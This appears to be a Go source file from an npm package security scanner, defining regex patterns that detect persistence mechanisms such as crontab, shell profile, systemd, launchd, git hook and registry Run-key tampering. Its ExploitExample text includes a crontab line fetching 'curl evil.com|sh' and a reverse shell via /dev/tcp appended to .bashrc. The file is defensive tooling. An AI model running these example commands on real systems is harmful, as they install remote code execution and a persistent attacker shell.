package analyzer

import (
	"fmt"
	"regexp"
)

// PersistenceAnalyzer detects system persistence mechanisms in JavaScript code:
// crontab injection, shell profile modification, systemd service creation,
// launchd plist generation, and git hooks injection.
type PersistenceAnalyzer struct{}

func NewPersistenceAnalyzer() *PersistenceAnalyzer {
	return &PersistenceAnalyzer{}
}

func (a *PersistenceAnalyzer) Name() string {
	return "persistence-mechanisms"
}

var persistencePatterns = []struct {
	Pattern     *regexp.Regexp
	Title       string
	Description string
	Severity    Severity
}{
	// Crontab injection
	{
		regexp.MustCompile(`crontab\s+(-[elru]|--)`),
		"Crontab manipulation",
		"Code manipulates crontab entries, a common persistence mechanism for scheduled malware re-execution",
		SeverityCritical,
	},
	{
		regexp.MustCompile(`/etc/cron|/var/spool/cron`),
		"System cron directory access",
		"Code accesses system cron directories to install persistent scheduled tasks",
		SeverityCritical,
	},
	// Shell profile modification
	{
		regexp.MustCompile(`(?i)(?:~|(?:\$HOME|\$\{HOME\}|process\.env\.HOME|os\.homedir\(\)))[/\\]+\.(bashrc|bash_profile|profile|zshrc|zprofile|zshenv)`),
		"Shell profile modification",
		"Code targets shell profile files for persistent code execution on every terminal session",
		SeverityCritical,
	},
	{
		regexp.MustCompile(`(?i)['"][^'"]*\.(bashrc|bash_profile|zshrc|zprofile)['"]`),
		"Shell profile modification",
		"Code references shell profile files, potentially for persistent code injection on every terminal session",
		SeverityCritical,
	},
	{
		regexp.MustCompile(`/etc/profile\.d/|/etc/environment`),
		"System-wide profile modification",
		"Code modifies system-wide shell profile, affecting all users on the system",
		SeverityCritical,
	},
	// Systemd service creation
	{
		regexp.MustCompile(`/etc/systemd/system/|/usr/lib/systemd/|\.config/systemd/user/`),
		"Systemd service creation",
		"Code creates systemd service files for persistent background process execution",
		SeverityCritical,
	},
	{
		regexp.MustCompile(`systemctl\s+(enable|daemon-reload|start)`),
		"Systemd service activation",
		"Code activates systemd services, establishing persistent system-level malware",
		SeverityCritical,
	},
	// launchd (macOS)
	{
		regexp.MustCompile(`(?i)Library/LaunchAgents/|Library/LaunchDaemons/`),
		"macOS LaunchAgent/Daemon creation",
		"Code creates macOS launch agents or daemons for persistent execution across reboots",
		SeverityCritical,
	},
	{
		regexp.MustCompile(`launchctl\s+(load|submit|enable)`),
		"macOS launchctl activation",
		"Code activates macOS launch services for persistent background execution",
		SeverityCritical,
	},
	{
		regexp.MustCompile(`ProgramArguments|RunAtLoad|StartInterval`),
		"macOS plist service definition",
		"Code generates macOS plist configuration with service execution directives",
		SeverityHigh,
	},
	// Git hooks injection
	{
		regexp.MustCompile(`\.git/hooks/(pre-commit|post-commit|pre-push|post-checkout|post-merge|pre-receive|post-receive|prepare-commit-msg|commit-msg|pre-rebase)`),
		"Git hook injection",
		"Code writes to git hook files, enabling code execution on every git operation",
		SeverityHigh,
	},
	{
		regexp.MustCompile(`git\s+config\s+(--global\s+)?core\.hooksPath`),
		"Git hooks path redirection",
		"Code redirects git hooks to a custom directory, potentially running attacker-controlled scripts on every git operation",
		SeverityHigh,
	},
	// Windows persistence
	{
		regexp.MustCompile(`(?i)HKEY_(LOCAL_MACHINE|CURRENT_USER)\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run`),
		"Windows registry autorun",
		"Code modifies Windows registry Run keys for persistent execution on login",
		SeverityCritical,
	},
	// Init.d (legacy Linux)
	{
		regexp.MustCompile(`/etc/init\.d/|update-rc\.d|chkconfig`),
		"SysV init service creation",
		"Code creates SysV init scripts for persistent system service execution",
		SeverityHigh,
	},
}

func (a *PersistenceAnalyzer) scanContent(content, filename string) []Finding {
	var findings []Finding

	for _, pat := range persistencePatterns {
		if pat.Pattern.MatchString(content) {
			findings = append(findings, Finding{
				Analyzer:    a.Name(),
				Title:       pat.Title,
				Description: fmt.Sprintf("%s in file %q.", pat.Description, filename),
				Severity:    pat.Severity,
				ExploitExample: "Persistence mechanisms ensure malware survives package removal:\n" +
					"    - Crontab: (crontab -l; echo '*/5 * * * * curl evil.com|sh') | crontab -\n" +
					"    - Shell profile: echo 'nohup bash -i >& /dev/tcp/c2/4444 0>&1 &' >> ~/.bashrc\n" +
					"    - Systemd: writes a .service file with ExecStart pointing to payload\n" +
					"    - Git hooks: every git commit/push re-triggers the malicious code",
				Remediation: "npm packages should never modify system services, shell profiles, or scheduled tasks. Remove immediately and check system for persistence artifacts.",
			})
		}
	}

	return findings
}
